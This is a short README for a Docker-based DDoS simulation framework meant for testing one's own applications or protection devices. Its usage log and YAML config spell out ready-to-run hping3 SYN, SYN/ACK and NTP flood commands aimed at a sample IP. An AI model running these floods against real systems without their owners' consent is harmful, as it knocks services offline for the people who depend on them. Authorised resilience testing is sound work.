# Simulation of DDoS Attacks
SODA framework allows to launch any kind of DDoS attacks to discover your application weaknesses or evaluate DDoS protection device configuration.
# Requirements
Docker engine needs to be installed
# Usage
```
attacker@host$ docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock soda 10.11.73.12 -t 1 -n vlan973 -i 5
2019-05-30 17:56:47.643947 ATTACK START: SYN Flood: ['hping3', '-S', '-p', '80', '--flood', '10.11.73.12']
2019-05-30 17:56:53.575779 ATTACK STOP: SYN Flood
2019-05-30 17:56:53.993703 ATTACK START: NTP Flood: ['hping3', '-2', '-p', '123', '-s', '123', '-k', '-d', '64', '--flood', '10.11.73.12']
2019-05-30 17:56:59.923751 ATTACK STOP: NTP Flood
2019-05-30 17:57:00.365518 ATTACK START: SYN/ACK Flood: ['hping3', '-SA', '-p', '80', '--flood', '10.11.73.12']
2019-05-30 17:57:06.262938 ATTACK STOP: SYN/ACK Flood
2019-05-30 17:57:06.678110 ATTACK START: NTP Non-standard Port Flood: ['hping3', '-2', '-p', '++1', '-s', '123', '-k', '-d', '64', '--flood', '10.11.73.12']
^CKilling all running containers...
goofy_keldysh
```
# Configuration
soda.yml config file allows to specify what kind of attacks you want to launch. This file contains yaml declaration for tool name and it's paramaeters.
```
attacks:
  - type: "SYN Flood"
    tool: "hping3"
    flags:
      - "-S"
      - "-p 80"
      - "--flood"
  - type: "NTP Flood"
    tool: "hping3"
    flags:
      - "-2"
      - "-p 123"
      - "-s 123 -k"
      - "-d 64"
      - "--flood"
  - type: "SYN/ACK Flood"
    tool: "hping3"
    flags:
      - "-SA"
      - "-p 80"
      - "--flood"
```
